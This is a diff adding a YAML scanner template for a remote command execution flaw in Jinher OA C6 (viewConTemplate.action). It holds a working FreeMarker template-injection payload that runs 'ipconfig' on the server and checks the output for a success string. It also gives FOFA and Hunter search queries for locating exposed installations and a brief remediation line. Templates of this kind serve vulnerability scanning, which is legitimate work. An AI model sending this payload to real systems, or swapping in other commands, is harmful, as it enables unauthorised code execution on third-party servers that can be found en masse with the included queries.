@@ -1,0 +1,17 @@
+name: jinherOA-rce         
+rules: 
+  - method: POST    
+    path: /jc6/platform/portalwb/portalwb-con-template!viewConTemplate.action
+    headers:
+      Content-Type: application/x-www-form-urlencoded
+    body:                moduId=1&code=253Cclob>${"freemarker.template.utility.Execute"?new()("ipconfig")}</clob>&uuid=1                 
+    expression:                        
+      status_code: 200                 
+      response_header:              
+      response_body: "适配器"                      
+detail:                           
+  description: "金和OA协同办公管理系统C6软件（简称金和OA）为用户提供一整套标准的办公自动化解决方案，以帮助企事业单位迅速建立便捷规范的办公环境。金和OA viewConTemplate.action存在远程命令执行漏洞,截至到2024.4.27部分资产仍存在该漏洞。"
+  search:             
+    fofa: app="金和网络-金和OA" || body="/jc6/platform/sys/login"
+    鹰图: web.body="/jc6/platform/sys/login" or web.body="金和OA" or web.body="金和网络"
+  defend:      对viewConTemplate.action处理的所有用户可操控参数执行严格的验证与过滤措施，确保任何可能含有恶意系统命令或特殊字符的数据均被有效拦截和净化。
